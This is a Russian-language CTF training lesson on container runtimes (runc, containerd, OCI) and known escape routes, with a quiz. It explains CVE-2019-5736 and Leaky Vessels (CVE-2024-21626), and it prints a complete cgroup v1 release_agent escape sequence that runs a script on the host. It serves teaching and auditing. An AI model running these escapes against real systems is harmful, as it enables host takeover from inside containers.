---
id: misc-container-runtime
title: "runc/containerd: CVE и побег из рантайма"
category: misc
parent: misc-sandbox-containers
difficulty: expert
order: 4
tags: [runc, containerd, docker, cve, escape, container]
prerequisites: [misc-sandbox-containers]
useful_for:
  - "CTF pwn/Misc категория"
  - "Аудит контейнерных платформ"
  - "Побег из контейнеров"
estimated_minutes: 30
summary: "Как устроен контейнерный рантайм (runc, containerd, OCI), известные CVE (runc exec, cgroup v1), проверка уязвимости и практические побеги."
---

## Вопрос, с которого всё начинается

Ты внутри контейнера, `docker.sock` не смонтирован, capabilities урезаны. Казалось бы, тупик. Но запуск контейнера — это целая **цепочка компонентов**, и каждый слой можно атаковать. Если рантайм (программа, которая реально создаёт контейнер) уязвим — побег возможен даже без лишних прав. Это урок про устройство контейнерного рантайма и известные CVE.

## Наш пример: побег на уровне рантайма

Docker CLI — это только интерфейс. Под ним спрятана цепочка: `docker` → `dockerd` → `containerd` → `containerd-shim` → **runc** (OCI-рантайм) → наш процесс. `runc` — эталонный рантайм, который читает описание контейнера и создаёт namespaces, cgroups и корень файловой системы. Уязвимость в `runc` — побег, который не требует ни сокета, ни `CAP_SYS_ADMIN`.

## Шаг 1: разбираем OCI-стек

**OCI** (Open Container Initiative) — стандарты, по которым строится контейнер:

- **OCI Image Spec** — формат образа (слои, конфиг);
- **OCI Runtime Spec** — как запускать: файл `config.json` с namespaces, cgroups, capabilities;
- **runc** — рантайм, который читает `config.json`, вызывает `clone()`, настраивает cgroups, делает `pivot_root` в корень образа и `execve`;
- **containerd** — демон, управляющий жизненным циклом;
- **CRI-O** — альтернатива для Kubernetes.

Любая ошибка в этой цепочке — вектор побега.

## Шаг 2: определяем рантайм и версию

Первое — понять, где мы и что за рантайм:

```bash
$ cat /proc/1/cgroup
0::/docker/a1b2c3d4
$ mount | grep overlay
overlay on / type overlay (rw,relatime,...)
$ docker version --format '{{.Server.Version}}'
24.0.7
$ runc --version
runc version 1.0.0-rc5
```

`overlay` подтверждает контейнер. Версия **сервера** Docker (не клиента!) — `24.0.7`, а `runc` — `1.0.0-rc5`. Последняя важна: версии `runc` и Docker нумеруются отдельно, и обновлённый Docker не значит обновлённый `runc`.

## Шаг 3: CVE-2019-5736 — перезапись runc

Самый известный контейнерный CVE. Механика:

1. Контейнер подменяет `/bin/sh` (или другой бинарь) на программу, которая открывает `/proc/self/exe`. В контексте контейнера `/proc/self/exe` — это и есть запущенный `runc`.
2. Оператор выполняет `docker exec -it <ctr> /bin/sh` — `runc` запускается и открывает наш подменённый бинарь.
3. Через `/proc/self/exe` мы открываем файл `runc` **на запись** и перезаписываем его полезной нагрузкой.
4. При следующем запуске `runc` на хосте исполняется наш код — побег.

Условие: доступ на запись в образ и оператор, выполняющий `exec`. Уязвимы `runc` до `1.0.0-rc6` (и соответствующие containerd). Наш `1.0.0-rc5` — в зоне риска.

## Шаг 4: Leaky Vessels (CVE-2024-21626)

Другая крупная уязвимость — незакрытые **file descriptor'ы**. `runc` оставлял открытым дескриптор рабочего каталога на хосте, и он протекал в контейнер через `/proc/self/fd`:

```bash
$ ls -l /proc/self/fd
lrwx------ 1 root root 64 ... 0 -> /dev/null
lrwx------ 1 root root 64 ... 1 -> pipe:[12345]
lrwx------ 1 root root 64 ... 3 -> /
$ cd /proc/self/fd/3 && ls
bin  boot  dev  etc  home  root  ...
```

Дескриптор `3` ведёт на **корень хоста**. Через `cd /proc/self/fd/3` мы получаем доступ к хост-файловой системе. Проверяй `ls -l /proc/self/fd` в любой подозрительной задаче — это бесплатно.

## Шаг 5: cgroup release_agent через рантайм

Если контейнер запущен с `CAP_SYS_ADMIN` на cgroup **v1**, работает классический побег через `release_agent` — механизм, который при «опустошении» cgroup запускает скрипт **на хосте**:

```bash
$ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
$ mkdir /tmp/cgrp/x
$ echo 1 > /tmp/cgrp/x/notify_on_release
$ host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
$ echo "$host_path/cmd" > /tmp/cgrp/release_agent
$ printf '#!/bin/sh\ncat /root/flag > /tmp/cgrp/x/out\n' > /cmd
$ chmod +x /cmd
$ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
$ cat /tmp/cgrp/x/out
FLAG{cgroup_v1_release_agent}
```

Логика: мы пишем в `release_agent` путь к скрипту на хосте, затем заставляем группу опустеть — ядро хоста запускает скрипт, который копирует флаг в доступное место. На cgroup **v2** механизм удалён — там ищите другие векторы.

## Шаг 6: OCI hooks — код на хосте

Ещё один слой — **hooks** в `config.json`: `prestart`, `createRuntime`, `poststart`, `poststop` — программы, которые рантайм выполняет на разных этапах. `prestart`-hook выполняется **на хосте** от имени демона. Если атакующий может повлиять на hook (через оркестратор или доступ к конфигу), это прямой побег. Именно поэтому права на изменение спецификации контейнера надо защищать так же строго, как сам сокет.

## Шаг 7: Kubernetes — та же цепочка через CRI

В Kubernetes контейнеры запускает **kubelet** через CRI (containerd/CRI-O) — та же цепочка, только сверху. Дополнительные поверхности: kubelet API (10250), etcd (2379), service-account tokens, admission controllers, RBAC. Если контейнер запущен с `hostPath`, `hostNetwork`, `privileged` или `hostPID`, изоляция почти отсутствует. Проверяй: смонтирован ли `containerd.sock`, есть ли token в `/var/run/secrets/kubernetes.io/serviceaccount/`, какие права у сервис-аккаунта (`kubectl auth can-i --list`).

## Что мы теперь знаем

- Контейнер создаёт цепочка **OCI-компонентов**, ключевой из них — **runc**.
- Версии Docker и **runc** независимы: проверяй серверную версию и `runc --version`.
- **CVE-2019-5736** — перезапись хостового `runc` через `/proc/self/exe` при `docker exec`.
- **CVE-2024-21626** (Leaky Vessels) — утечка хост-каталога через `/proc/self/fd`.
- **cgroup v1 `release_agent`** выполняет скрипт на хосте; в v2 удалён.
- **OCI hooks** выполняются на хосте — их подмена тоже побег.

## На что смотреть дальше

Собери локальную лабораторию с уязвимыми версиями `runc` и отработай CVE-2019-5736 и cgroup-побег. При отладке: если `docker version` показывает клиент, но не сервер — сокет недоступен, ищи альтернативные (`containerd.sock`, `crio.sock`). Если побег «не идёт» — проверь AppArmor/SELinux (`cat /proc/self/attr/current`) и `no-new-privileges` (`grep NoNewPrivs /proc/self/status`). Дальше — `misc-seccomp-escape` и Kubernetes-ветка (kubelet/etcd).

Важно помнить про **разницу версий**: клиент `docker` и серверный `runc` обновляются независимо, и «свежий» Docker CLI ничего не говорит об уязвимости рантайма. Определяй именно серверные версии (`docker version --format '{{.Server.Version}}'`, `runc --version`) и сверяй с публичными CVE. И держи в голове, что конфигурационные векторы (сокет, привилегии, монтирования) надёжнее CVE: они не зависят от конкретной версии и не роняют систему.

## Квиз

Проверь себя.

```quiz
- question: "Что такое runc?"
  options:
    - "эталонный OCI-рантайм, создающий контейнер (namespaces, cgroups)"
    - "сетевой плагин"
    - "реестр образов"
    - "оркестратор"
  answer: 0
  explanation: "runc читает config.json и запускает процесс."
- question: "Что эксплуатирует CVE-2019-5736?"
  options:
    - "перезапись хостового runc через /proc/self/exe при docker exec"
    - "переполнение буфера в ядре"
    - "SQL-инъекцию"
    - "XSS на странице"
  answer: 0
  explanation: "Классический runc-побег через подменённый бинарь."
- question: "Почему cgroup v1 release_agent не работает на cgroup v2?"
  options:
    - "в cgroup v2 механизм release_agent удалён"
    - "он требует Windows"
    - "он был только в BSD"
    - "он всегда выключен по умолчанию"
  answer: 0
  explanation: "В v2 другой интерфейс, release_agent отсутствует."
- question: "Что показывает ls -l /proc/self/fd в контексте побега?"
  options:
    - "открытые дескрипторы, среди которых может быть утечка хост-каталога"
    - "список пользователей системы"
    - "таблицу маршрутизации"
    - "версию ядра"
  answer: 0
  explanation: "CVE-2024-21626 — leaky file descriptors."
- question: "Как получить полный контроль над Docker-демоном из контейнера?"
  options:
    - "через смонтированный /var/run/docker.sock"
    - "через смену hostname"
    - "через ping"
    - "через смену пароля"
  answer: 0
  explanation: "Сокет даёт API демона — запуск контейнеров на хосте."
```

## Куда дальше

Дальше в ветке — `misc-sandbox-wasm` и песочницы языков (`misc-sandbox-langs`). А пока главное запомни: **контейнер — это цепочка программ, и уязвим может быть любой её слой** — от сокета до самого `runc`.

## Где пригодится

- **CTF misc/pwn** — побег из контейнера через CVE рантайма.
- **Аудит** — проверка версий рантаймов и конфигураций Docker/K8s.
- **Работа** — безопасность CI/CD и своевременное обновление рантаймов.
- **Research** — разбор контейнерных CVE и их эксплуатация.
